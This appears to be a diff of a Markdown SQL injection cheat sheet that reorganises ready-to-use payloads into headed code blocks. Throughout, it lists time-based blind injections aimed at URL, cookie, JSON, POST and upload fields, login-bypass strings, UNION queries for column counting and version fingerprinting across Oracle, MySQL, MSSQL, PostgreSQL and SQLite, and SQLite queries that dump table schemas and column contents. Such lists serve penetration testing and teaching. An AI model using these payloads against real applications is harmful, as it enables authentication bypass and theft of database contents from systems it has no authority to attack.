@@ -1,32 +1,50 @@
 ## Examples
 ```sql
 &topsort=flowers or sleep(3) >> Url
+
 &location=(select*from(select(sleep(3)))a) >> Cookie
+
 &direction=desc,(select*from(select(sleep(3)))a)& >> Cookie
+
 "accid":"25 and sleep(3)#" >> In json data
+
 &log=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z&pwd= >> Post data
+
 &comment_id=291751-sleep(5)& >>
+
 filename="poc.js' (select*from(select(sleep(3)))a) '.pdf" >> Uploading File
 ```
 ## Determinig SQLi Vulnerablity & Login Bypass
 ```sql
 1 or 1=1-- - >> Input box non string.
+
 1' or 1=1-- - >> Input box string.
+
 1' or 'abc'='abc'-- -
+
 1') or 1=1-- -
 ```
 ## Parameter Testing For Time Based Blind
 ```sql
 or sleep(5)
+
 (select*from(select(sleep(5)))a)
+
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+
 1'XOR(if(now()=sysdate(),sleep(3),0))OR' >> PATH
+
+(select*from(select(sleep(3)))a)
 ```
 ## Cookie testing 
 ```sql
 ' and 1=1-- - >> Conditional response (Boolean)
+
 ' || (select ' ') || ' >> Conditional error
+
 ' ||  (SELECT SLEEP(10))-- - >> Time delays
+
+(select*from(select(sleep(3)))a)
 ```
 ## Determining column numbers
 ```sql
@@ -40,24 +58,13 @@ or sleep(5)
 union select null, null >> Without quote in vulnerable parameter
 
 and 1=2 union select null, null >> Without quote in vulnerable parameter
-
-
-#To find a column containing strings
-
+```
+## To find a column containing strings
+```sql
 ' union select null, 'null', null-- -
-
-
-#To identify vulnerable columns
-
-' union select 1,2,3,4-- -
-
-union select 1,2,3,4 >> Without quote in vulnerable parameter
-
-and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
-
-
-#To fetch database version
-
+```
+## To fetch database version
+```sql
 ' union select banner, null from v$version-- - >> Oracle
 
 ' union select null, @@version-- - >> Mysql, MSsql
@@ -65,19 +72,27 @@ and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
 ' union select null, version()-- - >> PostgreSQL
 
 ' union select null, sqlite_version()-- - >> SQLite
+```
 
+## To identify vulnerable columns
+```sql
+' union select 1,2,3,4-- -
 
-#String concatenation
+union select 1,2,3,4 >> Without quote in vulnerable parameter
 
+and 1=2 union select 1,2,3,4 >> Without quote in vulnerable parameter
+```
+## String concatenation
+```sql
 Oracle 	'foo'||'bar'
 Microsoft 	'foo'+'bar'
 PostgreSQL 	'foo'||'bar'
 MySQL 	'foo' 'bar' [Note the space between the two strings]
 CONCAT('foo','bar')
+```
 
-
-#SQLite Database info retrieving
-
+## SQLite Database info retrieving
+```sql
 (SELECT group_concat(tbl_name) FROM sqlite_master)
 
 (SELECT sql FROM sqlite_master WHERE name ='[table name here]') >> To retrieve data from one table.
@@ -87,7 +102,7 @@ CONCAT('foo','bar')
 (SELECT group_concat([column name here]) from [table name here])
 
 (SELECT group_concat(column1 || "," || column2 || "," || column3 || ":") from [table name here]) >> To retrieve multiple columns data. 
-
+```
 
 #Oracle Database info retrieving
 
